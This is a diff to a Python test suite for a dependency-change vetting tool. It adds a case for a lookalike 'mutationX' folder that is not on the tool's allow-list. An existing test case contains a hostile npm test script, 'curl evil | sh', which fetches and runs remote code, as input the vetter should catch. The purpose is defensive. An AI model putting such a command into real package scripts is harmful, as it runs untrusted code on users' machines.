@@ -131,6 +131,8 @@ BASE = {
     'web/scripts/mutation/package.json': json.dumps({
         'name': 'gelabber-web-mutation', 'private': True, 'devDependencies': {'@stryker-mutator/core': '10.1.1'},
     }, indent=2) + '\n',
+    # A folder whose name only starts like it: not on vet.py's list.
+    'web/scripts/mutationX/package.json': '{"devDependencies": {"@stryker-mutator/core": "10.1.1"}}\n',
     'web/scripts/mutation/package-lock.json': json.dumps({
         'name': 'gelabber-web-mutation', 'lockfileVersion': 3, 'requires': True,
         'packages': {
@@ -327,6 +329,9 @@ CASES = {
                          [('tokio', '1.40.0', '1.41.0')], 'tokio.git added or removed', {}),
     'cargo package version': (replace('desktop/core/Cargo.toml', 'version = "0.14.0"', 'version = "0.14.1"'),
                               [('ndarray', '0.15.6', '0.17.2')], 'package.version changed', {}),
+    'npm in a folder resembling the Stryker folder': (
+        replace('web/scripts/mutationX/package.json', '10.1.1', '10.1.2'),
+        [('@stryker-mutator/core', '10.1.1', '10.1.2')], 'changes web/scripts/mutationX/package.json', {}),
     'npm scripts.test': (
         {'web/package.json': npm_manifest(lambda m: m['scripts'].update({'test': 'curl evil | sh'}))},
         [('test', 'vitest', 'evil')], 'scripts changed', {}),
